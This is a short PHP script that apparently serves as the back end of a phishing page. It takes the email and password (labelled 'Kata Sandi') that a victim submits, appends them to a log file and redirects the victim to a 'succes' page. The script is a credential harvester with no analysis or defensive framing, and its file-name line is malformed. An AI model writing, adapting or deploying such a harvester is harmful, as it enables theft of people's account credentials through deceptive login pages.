<?php
header("Location: succes.php");
$ADEx = "$_POST['alpanperdiansah3@gmail.com']";
$ADEy = $_POST['email'];
$ADEz = $_POST['pass'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "\n");
fwrite($handle, "<br>Email  :");
fwrite($handle, "\n");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "<br>Kata Sandi :");
fwrite($handle, "\n");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
exit;
?>